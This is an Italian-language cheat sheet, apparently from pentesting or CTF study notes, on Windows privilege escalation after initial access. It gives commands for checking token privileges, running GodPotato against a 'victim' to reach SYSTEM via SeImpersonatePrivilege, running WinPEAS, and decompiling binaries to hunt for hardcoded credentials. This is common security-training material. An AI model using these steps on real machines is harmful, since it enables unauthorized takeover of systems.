# Privilege Escalation (Windows)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `GodPotato`, `WinPEAS`, `Evil-WinRM`, `PowerShell` |
| **SO Target** | Windows |
| **Quando effettuare** | Dopo aver ottenuto accesso iniziale alla macchina |
| **Info Utili** | Abuso di privilegi specifici (SeImpersonate) o kernel exploit |

### Analisi Privilegi
Identificare i privilegi dell'utente attuale.
```powershell
whoami /priv
```

**Privilegi critici:**
- `SeImpersonatePrivilege`: Permette di impersonare altri utenti (tipico di account di servizio).
- `SeBackupPrivilege`: Permette di leggere qualsiasi file, ignorando le ACL.
- `SeEnableDelegationPrivilege`: Permette di attivare delegazioni Kerberos.

### GodPotato
Tool per elevare i privilegi ad `NT AUTHORITY\SYSTEM` sfruttando `SeImpersonatePrivilege`.

1. Upload del binario sulla vittima (tramite Evil-WinRM o curl).
2. Esecuzione:
```powershell
.\GodPotato-NET4.exe -cmd "cmd /c <COMMAND>"
```
*Esempio:*
```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
# Output: nt authority\system
```

### WinPEAS
Script per identificare automaticamente vettori di escalation locali.
1. Caricare `winPEAS.exe` sulla vittima.
2. Esecuzione:
```powershell
.\winPEAS.exe
```

### Tool di Decompilazione (dnSpy / ILSpy)
Utile per analizzare binari `.exe` o `.dll` e trovare credenziali hardcoded o command injection.

**Decompilazione riga di comando (ILSpy):**
```bash
ilspycmd <PATH_TO_EXE> > <OUTPUT_FILE>.cs
```
*Esempio:*
```bash
ilspycmd overwatch.exe > overwatch.cs
```

### URL Fondamentali
- [GodPotato GitHub](https://github.com/BeichenDream/GodPotato)
- [WinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [ILSpy Command Line](https://www.nuget.org/packages/ilspycmd/)
- [Hacktricks Windows Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/privilege-escalation/index.html)
